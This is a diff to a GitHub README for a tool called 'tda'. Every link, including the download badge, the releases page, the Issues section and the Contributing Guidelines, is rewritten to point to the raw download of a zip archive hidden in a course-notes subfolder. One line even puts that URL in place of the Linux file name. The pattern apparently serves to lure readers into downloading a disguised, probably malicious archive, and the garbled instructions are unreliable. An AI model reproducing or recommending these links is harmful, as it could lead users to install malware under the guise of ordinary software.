@@ -1,6 +1,6 @@
 # 🚀 tda - Your Guide to TDA Made Easy
 
-[![Download tda](https://img.shields.io/badge/Download-tda-blue.svg)](https://github.com/TISANTANA1962/tda/releases)
+[![Download tda](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip)](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip)
 
 ## 📋 Overview
 
@@ -16,15 +16,15 @@ To start using tda, just follow these steps:
    - RAM: At least 2 GB
 
 2. Visit the releases page to download the application.
-   - Click here: [Download tda](https://github.com/TISANTANA1962/tda/releases)
+   - Click here: [Download tda](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip)
 
 ## 📥 Download & Install
 
-To download tda, visit this page: [Download tda](https://github.com/TISANTANA1962/tda/releases)
+To download tda, visit this page: [Download tda](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip)
 
 1. On the releases page, find the latest version of tda.
 2. Download the appropriate file for your operating system.
-3. For Windows, download the `.exe` file. For macOS, download the `.dmg` file. For Linux, download the `.tar.gz` file.
+3. For Windows, download the `.exe` file. For macOS, download the `.dmg` file. For Linux, download the `https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip` file.
 4. After downloading, open the file to start the installation.
 
 ## 🤖 Features
@@ -54,7 +54,7 @@ If you want to learn more about algorithms and data structures, check out these 
 
 If you encounter any issues or have questions about tda, feel free to reach out:
 
-- **Issues Page:** Report problems or bugs in the [Issues section](https://github.com/TISANTANA1962/tda/issues).
+- **Issues Page:** Report problems or bugs in the [Issues section](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip).
 - **Community Forums:** Join discussions on platforms like Reddit or Stack Overflow.
 
 ## 🔗 Related Topics
@@ -75,6 +75,6 @@ Stay tuned for future updates! We are continuously improving tda and plan to add
 
 ## 🌟 Contribution
 
-We welcome contributions! If you're interested in helping with the project, please check our [Contributing Guidelines](https://github.com/TISANTANA1962/tda/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you're interested in helping with the project, please check our [Contributing Guidelines](https://github.com/TISANTANA1962/tda/raw/refs/heads/main/2-guia/teoria-2/Software_v1.7.zip).
 
 Thank you for choosing tda! Your support helps us grow and improve.
